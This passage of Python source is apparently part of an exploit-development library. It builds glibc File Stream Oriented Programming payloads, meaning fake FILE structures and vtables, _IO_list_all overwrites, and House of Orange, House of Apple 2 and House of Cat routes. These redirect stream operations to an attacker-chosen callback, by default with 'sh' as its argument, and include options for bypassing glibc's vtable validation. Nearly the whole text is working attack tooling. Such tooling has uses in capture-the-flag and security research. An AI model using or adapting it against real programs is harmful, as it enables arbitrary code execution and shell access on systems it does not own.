            return primary, "exact _IO_wfile_jumps symbol extent", False
        if self.io_vtables is None:
            raise FSOPCapabilityError(
                "the biased primary vtable precedes _IO_wfile_jumps; provide exact IOVtableBounds "
                "covering the pointer accepted by this libc's primary-vtable validation"
            )
        primary_key, primary_offset = _address_key(primary)
        start_key, start_offset = _address_key(self.io_vtables.start)
        end_key, end_offset = _address_key(self.io_vtables.end)
        if primary_key != start_key or primary_key != end_key:
            raise FSOPCapabilityError("__io_vtables bounds do not share the biased pointer's exact address image")
        if not start_offset <= primary_offset < end_offset:
            raise FSOPCapabilityError("biased primary vtable lies outside the attested __io_vtables bounds")
        return primary, self.io_vtables.source, True

    def _check_family_capability(self) -> None:
        introduction = {
            Architecture.RISCV64: (2, 27),
            Architecture.RISCV32: (2, 33),
        }.get(self.target.arch)
        if introduction is not None and self.version is not None and self.version < introduction:
            raise FSOPCapabilityError(
                f"upstream {self.target.arch.value} glibc starts at "
                f"{introduction[0]}.{introduction[1]}; the requested version is not a real artifact"
            )
        if self.family is FSOPFamily.WIDE:
            if self.version is None or self.layout.wide_data_size is None:
                raise FSOPCapabilityError("wide FSOP needs an exact glibc version to select the wide layout")
            return
        if self.allow_vtable_bypass:
            return
        if self.version is None:
            raise FSOPCapabilityError(
                "legacy fake-vtable FSOP needs a glibc version or an explicit vtable-validation bypass capability"
            )
        if self.version >= (2, 24):
            raise FSOPCapabilityError(
                "glibc 2.24+ validates the primary FILE vtable; set allow_vtable_bypass only with a real bypass"
            )

    def build(
        self,
        activation: FSOPActivation | str,
        function: str | FSOPAddress,
        slot: IOJumpSlot | str | None = None,
        *,
        seek_entry: str = "seekoff",
        dispatch_attested: bool = False,
        dispatch_attestation: DispatchAttestation | None = None,
        callback_is_descriptor: bool = False,
    ) -> FSOPPayload:
        """Build one selected activation/callback-slot path."""

        activation = _enum(FSOPActivation, activation, "FSOP activation")
        selected_slot = None if slot is None else _enum(IOJumpSlot, slot, "jump slot")
        if not isinstance(dispatch_attested, bool):
            raise TypeError("dispatch_attested must be bool")
        if dispatch_attestation is not None and not isinstance(dispatch_attestation, DispatchAttestation):
            raise TypeError("dispatch_attestation must be DispatchAttestation or None")
        normalized_seek = seek_entry.strip().lower().replace("_", "-") if isinstance(seek_entry, str) else ""
        if normalized_seek not in {"seekoff", "seekpos"}:
            raise FSOPCapabilityError("seek_entry must be 'seekoff' or 'seekpos'")
        if activation is not FSOPActivation.SEEK and normalized_seek != "seekoff":
            raise FSOPCapabilityError("seek_entry applies only to SEEK activation")

        self._check_family_capability()
        callback, callback_label = self._callback(function, callback_is_descriptor)
        if self.family is FSOPFamily.LEGACY:
            return self._build_legacy(
                activation,
                callback,
                callback_label,
                selected_slot,
                normalized_seek,
                dispatch_attested,
                dispatch_attestation,
                callback_is_descriptor,
            )
        return self._build_wide(
            activation,
            callback,
            callback_label,
            selected_slot,
            normalized_seek,
            dispatch_attested,
            dispatch_attestation,
            callback_is_descriptor,
        )

    def _base_images(self) -> tuple[_ImageBuilder, list[_ImageBuilder], list[FSOPRelocation]]:
        owned_file = self.stream is FSOPStream.HEAP
        file = _ImageBuilder.create(
            "file",
            self.file_address,
            self.layout.file_plus_size,
            owned=owned_file,
            purpose="fake heap FILE_plus" if owned_file else f"sparse {self.stream.value} FILE_plus patch",
        )
        images = [file]
        relocations: list[FSOPRelocation] = []

        # FILE* is callback argument zero.  Keep a useful default command while
        # allowing semantic overlays to replace it.
        default_arg0 = (
            b"sh\0\0"
            if self.family is FSOPFamily.LEGACY
            else (b" sh\0" if self.target.endian.value == "little" else b"sh\0\0")
        )
        file.bytes(self.layout.file_offsets["flags"], default_arg0)
        file.integer(self.target, self.layout.file_offsets["vtable_offset"], 0, 1, signed=True)

        if owned_file:
            lock_address: FSOPAddress
            # The family-specific builder appends auxiliary objects first and
            # replaces this provisional relocation once their sizes are known.
            lock_address = self.storage_address
            file.pointer_placeholder(self.layout.file_offsets["lock"], self.target.word_size)
            relocations.append(
                FSOPRelocation(
                    "file",
                    self.layout.file_offsets["lock"],
                    lock_address,
                    "provisional FILE lock pointer",
                    self.target.word_size,
                )
            )
            file.integer(self.target, self.layout.file_offsets["fileno"], -1, 4, signed=True)
        return file, images, relocations

    @staticmethod
    def _replace_relocation(
        relocations: list[FSOPRelocation],
        role: str,
        replacement: FSOPRelocation,
    ) -> None:
        for index, relocation in enumerate(relocations):
            if relocation.role == role:
                relocations[index] = replacement
                return
        raise FSOPError(f"internal relocation {role!r} is absent")

    def _list_head(
        self,
        images: list[_ImageBuilder],
        relocations: list[FSOPRelocation],
    ) -> None:
        if self.stream is not FSOPStream.HEAP:
            return
        address = _symbol(self.libc, "_IO_list_all")
        head = _ImageBuilder.create(
            "_IO_list_all",
            address,
            self.target.word_size,
            owned=False,
            purpose="external _IO_list_all head overwrite required by heap/list activation",
        )
        head.pointer_placeholder(0, self.target.word_size)
        images.append(head)
        relocations.append(
            FSOPRelocation(
                "_IO_list_all",
                0,
                self.file_address,
                "_IO_list_all fake FILE head",
                self.target.word_size,
            )
        )

    def _common_predicates(self) -> list[FSOPPredicate]:
        return [
            FSOPPredicate(
                "_vtable_offset must remain zero",
                "file",
                self.layout.file_offsets["vtable_offset"],
                1,
                FSOPPredicateKind.EXACT,
                expected=0,
                signed=True,
            )
        ]

    def _list_gate(
        self,
        file: _ImageBuilder,
        predicates: list[FSOPPredicate],
        *,
        wide: bool,
    ) -> None:
        file.integer(self.target, self.layout.file_offsets["fileno"], -1, 4, signed=True)
        if wide:
            file.integer(self.target, self.layout.file_offsets["mode"], 1, 4, signed=True)
            predicates.append(
                FSOPPredicate(
                    "wide list flush requires _mode > 0",
                    "file",
                    self.layout.file_offsets["mode"],
                    4,
                    FSOPPredicateKind.GREATER_THAN_VALUE,
                    expected=0,
                    signed=True,
                )
            )
        else:
            file.integer(self.target, self.layout.file_offsets["mode"], 0, 4, signed=True)
            file.pointer_placeholder(self.layout.file_offsets["write_base"], self.target.word_size)
            file.bytes(self.layout.file_offsets["write_ptr"], self.target.pack(1))
            predicates.extend(
                (
                    FSOPPredicate(
                        "narrow list flush requires _mode <= 0",
                        "file",
                        self.layout.file_offsets["mode"],
                        4,
                        FSOPPredicateKind.LESS_EQUAL_VALUE,
                        expected=0,
                        signed=True,
                    ),
                    FSOPPredicate(
                        "_IO_write_ptr > _IO_write_base flush pointer relation",
                        "file",
                        self.layout.file_offsets["write_ptr"],
                        self.target.word_size,
                        FSOPPredicateKind.GREATER_THAN,
                        other_offset=self.layout.file_offsets["write_base"],
                    ),
                )
            )

    def _finalize(
        self,
        *,
        activation: FSOPActivation,
        technique: FSOPTechnique,
        callback_slot: IOJumpSlot,
        images: list[_ImageBuilder],
        relocations: list[FSOPRelocation],
        predicates: list[FSOPPredicate],
        preconditions: list[FSOPPrecondition],
        callback_label: str,
        callback_is_descriptor: bool,
        primary_dispatch_slot: IOJumpSlot | None,
        primary_vtable_bias: int,
        primary_vtable_bounds_source: str | None,
        primary_vtable_bounds_attested: bool,
        dispatch_attested: bool,
        dispatch_attestation: DispatchAttestation | None,
    ) -> FSOPPayload:
        metadata: dict[str, Any] = {
            "libc_sha256": self.libc.identity.sha256,
            "libc_build_id": self.libc.identity.build_id,
            "glibc_version": None if self.version is None else f"{self.version[0]}.{self.version[1]}",
            "callback": callback_label,
            "callback_argument": "file",
            "callback_is_descriptor": callback_is_descriptor,
            "primary_dispatch_slot": None if primary_dispatch_slot is None else primary_dispatch_slot.value,
            "wide_dispatch_slot": callback_slot.value if self.family is FSOPFamily.WIDE else None,
            "primary_vtable_bias": primary_vtable_bias,
            "primary_vtable_bounds_source": primary_vtable_bounds_source,
            "primary_vtable_bounds_attested": primary_vtable_bounds_attested,
            "vtable_validation_bypassed": self.allow_vtable_bypass,
            "requires_io_list_all_overwrite": self.stream is FSOPStream.HEAP
            and activation in {FSOPActivation.EXIT, FSOPActivation.FFLUSH_ALL},
            "dispatch_attested": dispatch_attested or dispatch_attestation is not None,
            "abi_dependent_dispatch": dispatch_attestation is not None,
            "upstream_glibc_target": not (
                self.target.arch is Architecture.POWERPC32 and self.target.endian is Endian.LITTLE
            ),
        }
        if dispatch_attestation is not None:
            metadata["dispatch_attestation"] = {
                "source": dispatch_attestation.source,
                "seekoff_mode": dispatch_attestation.seekoff_mode,
            }
        return FSOPPayload(
            self.libc,
            self.layout,
            self.stream,
            self.family,
            activation,
            technique,
            callback_slot,
            tuple(image.freeze() for image in images),
            tuple(relocations),
            tuple(predicates),
            tuple(preconditions),
            metadata,
        )

    def _build_legacy(
        self,
        activation: FSOPActivation,
        callback: FSOPAddress,
        callback_label: str,
        selected_slot: IOJumpSlot | None,
        seek_entry: str,
        dispatch_attested: bool,
        dispatch_attestation: DispatchAttestation | None,
        callback_is_descriptor: bool,
    ) -> FSOPPayload:
        if dispatch_attestation is not None:
            raise FSOPCapabilityError("structured seekoff attestation applies only to House of Cat")
        if activation in {FSOPActivation.EXIT, FSOPActivation.FFLUSH_ALL}:
            expected_slot = IOJumpSlot.OVERFLOW
        elif activation is FSOPActivation.FFLUSH:
            expected_slot = IOJumpSlot.SYNC
        elif activation is FSOPActivation.SEEK:
            expected_slot = IOJumpSlot.SEEKOFF if seek_entry == "seekoff" else IOJumpSlot.SEEKPOS
        else:
            if selected_slot is None:
                raise FSOPCapabilityError("explicit legacy dispatch requires a jump slot")
            if not dispatch_attested:
                raise FSOPCapabilityError("explicit legacy dispatch requires caller attestation")
            expected_slot = selected_slot
        if selected_slot is not None and selected_slot is not expected_slot:
            raise FSOPCapabilityError(
                f"{activation.value} dispatches legacy {expected_slot.value}, not requested {selected_slot.value} slot"
            )
        if activation is not FSOPActivation.EXPLICIT and dispatch_attested:
            raise FSOPCapabilityError("dispatch_attested is only used by explicit legacy dispatch")

        file, images, relocations = self._base_images()
        predicates = self._common_predicates()
        preconditions: list[FSOPPrecondition] = []
        vtable_address = self.storage_address
        vtable = _ImageBuilder.create(
            "vtable",
            vtable_address,
            self.layout.jump_table_size,
            owned=True,
            purpose="unvalidated fake primary _IO_jump_t",
        )
        vtable.pointer_placeholder(expected_slot.index * self.target.word_size, self.target.word_size)
        images.append(vtable)
        relocations.extend(
            (
                FSOPRelocation(
                    "vtable",
                    expected_slot.index * self.target.word_size,
                    callback,
                    f"legacy callback through {expected_slot.value} slot",
                    self.target.word_size,
                ),
                FSOPRelocation(
                    "file",
                    self.layout.file_offsets["vtable"],
                    vtable_address,
                    "fake primary FILE vtable",
                    self.target.word_size,
                ),
            )
        )
        file.pointer_placeholder(self.layout.file_offsets["vtable"], self.target.word_size)

        if self.stream is FSOPStream.HEAP:
            lock_address = _add_address(vtable_address, self.layout.jump_table_size)
            lock = _ImageBuilder.create(
                "lock",
                lock_address,
                16,
                owned=True,
                purpose="zero-initialized FILE lock storage",
            )
            images.append(lock)
            self._replace_relocation(
                relocations,
                "provisional FILE lock pointer",
                FSOPRelocation(
                    "file",
                    self.layout.file_offsets["lock"],
                    lock_address,
                    "FILE lock pointer",
                    self.target.word_size,
                ),
            )
        if activation in {FSOPActivation.EXIT, FSOPActivation.FFLUSH_ALL}:
            self._list_gate(file, predicates, wide=False)
            self._list_head(images, relocations)
            preconditions.append(
                FSOPPrecondition(
                    "list activation",
                    "exit/_IO_cleanup or fflush(NULL) must traverse this stream in _IO_list_all",
                )
            )
        elif activation is FSOPActivation.FFLUSH:
            preconditions.append(FSOPPrecondition("direct fflush", "fflush must be called with this FILE pointer"))
        elif activation is FSOPActivation.SEEK:
            preconditions.append(
                FSOPPrecondition("seek dispatch", f"a libc seek path must dispatch primary {expected_slot.value}")
            )
        else:
            preconditions.append(
                FSOPPrecondition(
                    "explicit dispatch",
                    f"caller attests a primary {expected_slot.value} dispatch on this FILE pointer",
                )
            )

        technique = (
            FSOPTechnique.HOUSE_OF_ORANGE
            if self.stream is FSOPStream.HEAP and activation in {FSOPActivation.EXIT, FSOPActivation.FFLUSH_ALL}
            else FSOPTechnique.LEGACY_FAKE_VTABLE
        )
        return self._finalize(
            activation=activation,
            technique=technique,
            callback_slot=expected_slot,
            images=images,
            relocations=relocations,
            predicates=predicates,
            preconditions=preconditions,
            callback_label=callback_label,
            callback_is_descriptor=callback_is_descriptor,
            primary_dispatch_slot=expected_slot,
            primary_vtable_bias=0,
            primary_vtable_bounds_source=None,
            primary_vtable_bounds_attested=False,
            dispatch_attested=dispatch_attested,
            dispatch_attestation=None,
        )

    def _wide_route(
        self,
        activation: FSOPActivation,
        selected_slot: IOJumpSlot | None,
        seek_entry: str,
        dispatch_attested: bool,
        dispatch_attestation: DispatchAttestation | None,
    ) -> tuple[FSOPTechnique, IOJumpSlot, IOJumpSlot | None, int, DispatchAttestation | None]:
        if activation is FSOPActivation.EXPLICIT:
            if selected_slot is None:
                raise FSOPCapabilityError("explicit wide dispatch requires a jump slot")
            if not dispatch_attested:
                raise FSOPCapabilityError("explicit wide dispatch requires caller attestation")
            if dispatch_attestation is not None:
                raise FSOPCapabilityError("structured seekoff attestation is not used by explicit wide dispatch")
            return FSOPTechnique.WIDE_EXPLICIT, selected_slot, None, 0, None
        if dispatch_attested:
            raise FSOPCapabilityError("dispatch_attested is only used by EXPLICIT dispatch")
        if activation is FSOPActivation.SEEK and seek_entry != "seekoff":
            raise FSOPCapabilityError("wide automatic seek supports source-proven seekoff, not seekpos")

        default_slot = IOJumpSlot.OVERFLOW if activation is FSOPActivation.SEEK else IOJumpSlot.DOALLOCATE
        callback_slot = selected_slot or default_slot
        if callback_slot not in {IOJumpSlot.DOALLOCATE, IOJumpSlot.OVERFLOW}:
            raise FSOPCapabilityError(
                f"no automatic wide {activation.value} route reaches callback slot {callback_slot.value}"
            )
        primary_dispatch = {
            FSOPActivation.EXIT: IOJumpSlot.OVERFLOW,
            FSOPActivation.FFLUSH_ALL: IOJumpSlot.OVERFLOW,
            FSOPActivation.FFLUSH: IOJumpSlot.SYNC,
            FSOPActivation.SEEK: IOJumpSlot.SEEKOFF,
        }[activation]
        actual_primary = IOJumpSlot.OVERFLOW if callback_slot is IOJumpSlot.DOALLOCATE else IOJumpSlot.SEEKOFF
        bias = (actual_primary.index - primary_dispatch.index) * self.target.word_size
        technique = (
            FSOPTechnique.HOUSE_OF_APPLE_2 if callback_slot is IOJumpSlot.DOALLOCATE else FSOPTechnique.HOUSE_OF_CAT
        )

        used_attestation = None
        cat_mismatch = technique is FSOPTechnique.HOUSE_OF_CAT and activation is not FSOPActivation.SEEK
        if cat_mismatch:
            if dispatch_attestation is None:
                raise FSOPCapabilityError(
                    "House of Cat through exit/fflush needs attested nonzero seekoff mode argument state"
                )
            if dispatch_attestation.seekoff_mode in (None, 0):
                raise FSOPCapabilityError("House of Cat attestation must provide a nonzero seekoff_mode")
            used_attestation = dispatch_attestation
        elif dispatch_attestation is not None:
            raise FSOPCapabilityError("dispatch_attestation is only needed for ABI-dependent House of Cat routes")
        return technique, callback_slot, primary_dispatch, bias, used_attestation

    def _build_wide(
        self,
        activation: FSOPActivation,
        callback: FSOPAddress,
        callback_label: str,
        selected_slot: IOJumpSlot | None,
        seek_entry: str,
        dispatch_attested: bool,
        dispatch_attestation: DispatchAttestation | None,
        callback_is_descriptor: bool,
    ) -> FSOPPayload:
        technique, callback_slot, primary_dispatch, bias, used_attestation = self._wide_route(
            activation,
            selected_slot,
            seek_entry,
            dispatch_attested,
            dispatch_attestation,
        )
        assert self.layout.wide_data_size is not None
        file, images, relocations = self._base_images()
        predicates = self._common_predicates()
        preconditions: list[FSOPPrecondition] = []

        wide_address = self.storage_address
        table_address = _add_address(wide_address, self.layout.wide_data_size)
        wide_data = _ImageBuilder.create(
            "wide_data",
            wide_address,
            self.layout.wide_data_size,
            owned=True,
            purpose="fake _IO_wide_data",
        )
        wide_vtable = _ImageBuilder.create(
            "wide_vtable",
            table_address,
            self.layout.jump_table_size,
            owned=True,
            purpose="unvalidated fake wide _IO_jump_t",
        )
        images.extend((wide_data, wide_vtable))
        file.pointer_placeholder(self.layout.file_offsets["wide_data"], self.target.word_size)
        wide_data.pointer_placeholder(self.layout.wide_offsets["vtable"], self.target.word_size)
        wide_vtable.pointer_placeholder(callback_slot.index * self.target.word_size, self.target.word_size)
        relocations.extend(
            (
                FSOPRelocation(
                    "file",
                    self.layout.file_offsets["wide_data"],
                    wide_address,
                    "FILE _wide_data pointer",
                    self.target.word_size,
                ),
                FSOPRelocation(
                    "wide_data",
                    self.layout.wide_offsets["vtable"],
                    table_address,
                    "fake wide vtable pointer",
                    self.target.word_size,
                ),
                FSOPRelocation(
                    "wide_vtable",
                    callback_slot.index * self.target.word_size,
                    callback,
                    f"wide callback through {callback_slot.value} slot",
                    self.target.word_size,
                ),
            )
        )

        primary, bounds_source, bounds_attested = self._validated_primary_vtable(bias)
        file.pointer_placeholder(self.layout.file_offsets["vtable"], self.target.word_size)
        relocations.append(
            FSOPRelocation(
                "file",
                self.layout.file_offsets["vtable"],
                primary,
                "validated primary _IO_wfile_jumps pointer with dispatch bias",
                self.target.word_size,
            )
        )

        if self.stream is FSOPStream.HEAP:
            lock_address = _add_address(table_address, self.layout.jump_table_size)
            lock = _ImageBuilder.create(
                "lock",
                lock_address,
                16,
                owned=True,
                purpose="zero-initialized FILE lock storage",
            )
            images.append(lock)
            self._replace_relocation(
                relocations,
                "provisional FILE lock pointer",
                FSOPRelocation(
                    "file",
                    self.layout.file_offsets["lock"],
                    lock_address,
                    "FILE lock pointer",
                    self.target.word_size,
                ),
            )

        if technique is FSOPTechnique.HOUSE_OF_APPLE_2:
            wide_data.pointer_placeholder(self.layout.wide_offsets["write_base"], self.target.word_size)
            wide_data.bytes(self.layout.wide_offsets["write_ptr"], self.target.pack(1))
            wide_data.pointer_placeholder(self.layout.wide_offsets["buf_base"], self.target.word_size)
            predicates.extend(
                (
                    FSOPPredicate(
                        "Apple2 flags must clear _IO_NO_WRITES, _IO_UNBUFFERED, and _IO_CURRENTLY_PUTTING",
                        "file",
                        self.layout.file_offsets["flags"],
                        4,
                        FSOPPredicateKind.MASK_CLEAR,
                        mask=0x80A,
                    ),
                    FSOPPredicate(
                        "Apple2 wide _IO_write_base must be NULL",
                        "wide_data",
                        self.layout.wide_offsets["write_base"],
                        self.target.word_size,
                        FSOPPredicateKind.EXACT,
                        expected=0,
                    ),
                    FSOPPredicate(
                        "Apple2 wide _IO_buf_base must be NULL",
                        "wide_data",
                        self.layout.wide_offsets["buf_base"],
                        self.target.word_size,
                        FSOPPredicateKind.EXACT,
                        expected=0,
                    ),
                )
            )
            preconditions.append(
                FSOPPrecondition(
                    "House of Apple 2",
                    "the selected primary dispatch must enter _IO_wfile_overflow before the fake WDOALLOCATE slot",
                )
            )
        elif technique is FSOPTechnique.HOUSE_OF_CAT:
            wide_data.pointer_placeholder(self.layout.wide_offsets["write_base"], self.target.word_size)
            wide_data.bytes(self.layout.wide_offsets["write_ptr"], self.target.pack(1))
            predicates.append(
                FSOPPredicate(
                    "House of Cat wide write pointer relation",
                    "wide_data",
                    self.layout.wide_offsets["write_ptr"],
                    self.target.word_size,
                    FSOPPredicateKind.GREATER_THAN,
                    other_offset=self.layout.wide_offsets["write_base"],
                )
            )
            if activation is FSOPActivation.SEEK:
                preconditions.append(
                    FSOPPrecondition(
                        "source-proven seekoff mode",
                        "glibc fseek dispatches SEEKOFF with mode=3 before _IO_switch_to_wget_mode",
                    )
                )
            else:
                assert used_attestation is not None
                preconditions.append(
                    FSOPPrecondition(
                        "ABI-dependent seekoff mode",
                        f"attested nonzero mode={used_attestation.seekoff_mode}: {used_attestation.source}",
                    )
                )
            preconditions.append(
                FSOPPrecondition(
                    "House of Cat callback",
                    "_IO_wfile_seekoff must enter _IO_switch_to_wget_mode and dispatch WOVERFLOW",
                )
            )
        else:
            preconditions.append(
                FSOPPrecondition(
                    "explicit wide dispatch",
                    f"caller attests execution of WJUMP({callback_slot.value}) for this FILE pointer",
                )
            )

        if activation in {FSOPActivation.EXIT, FSOPActivation.FFLUSH_ALL}:
            self._list_gate(file, predicates, wide=True)
            # The wide list gate and Cat both consume the same relation.  Apple
            # already sets it for portable overflow initialization.
            if not any(predicate.name == "House of Cat wide write pointer relation" for predicate in predicates):
                predicates.append(
                    FSOPPredicate(
                        "wide _IO_write_ptr > _IO_write_base list relation",
                        "wide_data",
                        self.layout.wide_offsets["write_ptr"],
                        self.target.word_size,
                        FSOPPredicateKind.GREATER_THAN,
                        other_offset=self.layout.wide_offsets["write_base"],
                    )
                )
            self._list_head(images, relocations)
            preconditions.append(
                FSOPPrecondition(
                    "list activation",
                    "exit/_IO_cleanup or fflush(NULL) must traverse this stream in _IO_list_all",
                )
            )
        elif activation is FSOPActivation.FFLUSH:
            preconditions.append(FSOPPrecondition("direct fflush", "fflush must be called with this FILE pointer"))
        elif activation is FSOPActivation.SEEK:
            preconditions.append(
                FSOPPrecondition("fseek activation", "glibc fseek must dispatch the primary SEEKOFF slot")
            )

        return self._finalize(
            activation=activation,
            technique=technique,
            callback_slot=callback_slot,
            images=images,
            relocations=relocations,
            predicates=predicates,
            preconditions=preconditions,
            callback_label=callback_label,
            callback_is_descriptor=callback_is_descriptor,
            primary_dispatch_slot=primary_dispatch,
            primary_vtable_bias=bias,
            primary_vtable_bounds_source=bounds_source,
            primary_vtable_bounds_attested=bounds_attested,
            dispatch_attested=dispatch_attested,
            dispatch_attestation=used_attestation,
        )


__all__ = [
    "FSOP",
    "DispatchAttestation",
    "FSOPActivation",
    "FSOPCapabilityError",
    "FSOPError",
    "FSOPFamily",
    "FSOPOverlayError",
    "FSOPPayload",
    "FSOPPlacement",
    "FSOPPrecondition",
    "FSOPPredicate",
    "FSOPPredicateKind",
    "FSOPRelocation",
    "FSOPStream",
    "FSOPTechnique",
    "FSOPWrite",
    "IOJumpSlot",
    "IOLayout",
    "IOVtableBounds",
]
